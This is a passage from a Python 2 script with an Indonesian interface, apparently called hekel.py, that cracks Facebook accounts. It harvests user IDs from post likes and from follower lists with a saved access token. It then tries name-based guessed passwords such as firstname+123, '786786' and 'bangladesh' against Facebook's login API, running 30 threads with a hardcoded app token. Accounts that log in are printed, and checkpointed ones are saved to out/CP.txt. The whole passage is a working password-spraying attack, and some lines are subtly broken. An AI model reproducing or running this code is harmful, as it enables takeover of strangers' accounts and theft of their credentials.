													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name'].lower()+'234'
																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39m | \033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;0;93m[CP] \033[0;0;39m ' + user + '\x1b[0;0;39m | \033[0;39m ' + pass8 + '\033[0;39mm | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
																			cekpoint.append(user+pass8)
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mSelesai ...'
	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mfile tersimpan \033[1;91m: \033[1;92mdone/bangla.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;96mKembali\033[1;97m>}")
	os.system("python2 hekel.py")
	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print (" [\033[1;96m[●●● \033[1;97mCRACK POSTINGAN GRUP/TEMAN\033[1;96m ●●●]")
		print 50* "\033[1;94m─"
		tez = raw_input("\033[1;97m[\033[1;96m●\033[1;97m]\033[1;96m ID Postingan Group/Teman \033[1;91m :\033[1;92m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mMengambil ID \033[1;97m...')
	except KeyError:
		print"\033[1;97m[\033[1;91m!\033[1;97m] ID Postingan Salah !"
		raw_input("\n\033[1;96m[<\033[1;97mKembali>\033[1;96m]")
		menu()
		
	print "\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m[\033[1;96m●\033[1;97m] \033[1;96mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN LIKES #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;93m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = '786786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;90;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name'].lower()+'234'
																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39m | \033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;0;93m[CP] \033[0;0;39m ' + user + '\x1b[0;0;39m | \033[0;39m ' + pass8 + '\033[0;39mm | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
																			cekpoint.append(user+pass8)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mSelesai ...'
	print"\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mTotal \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;96m"+str(len(cekpoint))
	print '\033[1;97m{\033[1;96m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;96mCP \033[1;96mfile tersimpan \033[1;91m: \033[1;92mdone/grup.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;96mKembali\033[1;97m>}")
	os.system("python2 hekel.py")
	
##### CRACK FOLLOW #####
def crack_follow():
	toket=open('login.txt','r').read()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print ("[\033[1;95m●●● \033[1;97mCRACK FOLLOWERS \033[1;95m●●●]")
	print 50* "\033[1;94m─"
	idt = raw_input("\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mID Publik/Teman \033[1;91m:\033[1;92m ")
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mNama \033[1;91m:\033[1;92m "+op["name"]
	except KeyError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
		raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
		keluar()
	r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
	z = json.loads(r.text)
	for i in z['data']:
		id.append(i['id'])
		
	print "\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mTotal ID Followers \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;95m●\033[1;97m} \033[1;95mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN FOLLOW #####
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass1 + '\033[0;39m | \033[0;39m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[0;93m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[0;36;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass2 + '\033[0;39m | \033[0;39m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass3 + '\033[0;39m | \033[0;39m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = '786786'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[0;92m[OK] \033[0;39m ' + user  + ' \033[0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[0;90;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;36;0;39m | \033[0;39m ' + pass4 + '\033[0;39m | \033[0;39m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass5 + '\033[0;39m | \033[0;39m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'].lower()+'786'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass6 + '\033[0;39m | \033[0;39m' + b['name']
															cek = open("out/CP.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															pass7 = b['last_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\033[0;92m[OK] \033[0;39m ' + user  + ' \x1b[0;36;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[0;0;93m[CP] \033[0;39m ' + user  + ' \x1b[0;0;39m | \033[0;39m ' + pass7 + '\033[0;39m | \033[0;39m' + b['name']
																	cek = open("out/CP.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																else:
																	pass8 = b['last_name'].lower()+'234'
																	data = urllib.urlopen("https://b-api.facebook.com/methode/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f522ef6")
																	q = json.load(data)
																	if 'access_token' in q:
																		print '\033[0;92m[OK] \033[0;39m '+ user + ' \x1b[0;36;39m | \033[0;39m ' + pass8 + '\033[0;39m | \033[0;39m' + b['name']
																		oks.append(user+pass8)
																	else:
																		if 'www.facebook.com' in q["error_msg"]:
																			print '\x1b[0;0;93m[CP] \033[0;0;39m ' + user + '\x1b[0;0;39m | \033[0;39m ' + pass8 + '\033[0;39mm | \033[0;39m' + b['name']
																			cek = open("out/CP.txt", "a")
																			cek.close()
																			cekpoint.append(user+pass8)
																	
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m[\033[1;95m●\033[1;97m] \033[1;95mSelesai ...'
	print"\033[1;97m[\033[1;95m●\033[1;97m] \033[1;95mTotal \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
	print '\033[1;97m[\033[1;95m●\033[1;97m] \033[1;92mOK\033[1;97m/\x1b[1;95mCP \033[1;95mfile tersimpan \033[1;91m: \033[1;92mdone/follow.txt'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m{<\033[1;95mKembali\033[1;97m>}")
	os.system("python2 hekel.py")
	
##### USERNAME ID ####
def user_id():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	ling = ('https://www.facebook.com/')
	url = ling+raw_input("\033[1;97m[\033[1;95m×\033[1;97m] Username : ")
	idre = re.compile('"entity_id":"([0-9]+)"')
	page = requests.get(url)
	print idre.findall(page.content)
	raw_input("\n\033[1;95m[\033[1;97m<Kembali>\033[1;95m]")
	menu()
	
##### PERBARUI #####
def perbarui():
	os.system("clear")
	print logo
	print "\033[1;94m──────────────────────────────────────────────────"
	jalan ("\033[1;92mMemperbarui Script ...\033[1;93m")
	os.system("git pull origin master")
	raw_input("\n\033[1;94m{\033[1;97m<Kembali>\033[1;94m}")
	os.system("python2 hekel.py")
	
if __name__=='__main__':
	login ()
	masuk()